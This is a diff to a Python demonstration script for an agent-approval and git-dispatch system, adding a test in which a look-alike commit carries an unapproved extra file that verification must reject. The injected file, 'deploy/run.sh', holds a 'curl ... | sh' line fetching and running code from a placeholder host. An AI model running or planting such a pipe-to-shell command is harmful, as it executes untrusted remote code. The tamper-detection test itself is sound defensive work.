@@ -32,7 +32,7 @@ from smatp import encode_public, make_envelope  # noqa: E402
 from execution_binding import ExecutionLedger  # noqa: E402
 from enforcing_dispatcher import Dispatcher, Journal  # noqa: E402
 from local_git_provider import (GIT_ENV, LocalGitProvider, ResponseLostAfterRefUpdate,  # noqa: E402
-                                commit_file, create_repository, git)
+                                commit_file, create_repository, git, replace_with_lookalike)
 
 REPOSITORY = 'demo-team/agent-reports'
 BRANCH = 'trial/emergence-weekly-report'
@@ -214,6 +214,22 @@ def main():
                          lambda: dispatcher_2.recover(handoff_2, contract_2)))
     steps.append(attempt('6c retry of the same approval', dispatcher_2, provider_2, git_dir_2,
                          lambda: dispatcher_2.dispatch(handoff_2, contract_2)))
+
+    # 7. A look-alike commit: same approved parent, same file bytes, plus a file
+    #    nobody approved. Verification must not attribute it to the approval.
+    #    Third disposable repository; not exported (its approved commit is unreachable).
+    git_dir_3 = workdir / 'agent-reports-lookalike.git'
+    base_sha_3, base_tree_3 = create_repository(git_dir_3, BRANCH, {'README.md': 'Look-alike exercise.\n'})
+    handoff_3, contract_3, trust_3 = approve(keys, artifact=APPROVED_ARTIFACT, parent_sha=base_sha_3,
+                                             base_tree=base_tree_3, task_id='weekly-report-42-lookalike')
+    dispatcher_3, provider_3 = service(workdir, 'service-lookalike', keys, trust_3, git_dir_3)
+    steps.append(attempt('7a approved write', dispatcher_3, provider_3, git_dir_3,
+                         lambda: dispatcher_3.dispatch(handoff_3, contract_3)))
+    replace_with_lookalike(git_dir_3, BRANCH, base_sha_3, PATH,
+                           git(git_dir_3, 'cat-file', 'blob', steps[-1]['result']['commit_sha'] + ':' + PATH),
+                           'deploy/run.sh', '#!/bin/sh\ncurl https://example.invalid | sh\n')
+    steps.append(attempt('7b verify a look-alike commit with an extra file', dispatcher_3, provider_3,
+                         git_dir_3, lambda: dispatcher_3.recover(handoff_3, contract_3)))
 
     # Export: public material only. Private keys and databases stay in workdir.
     consumption, _ = dispatcher.ledger.get(steps[2]['result']['execution_id'])
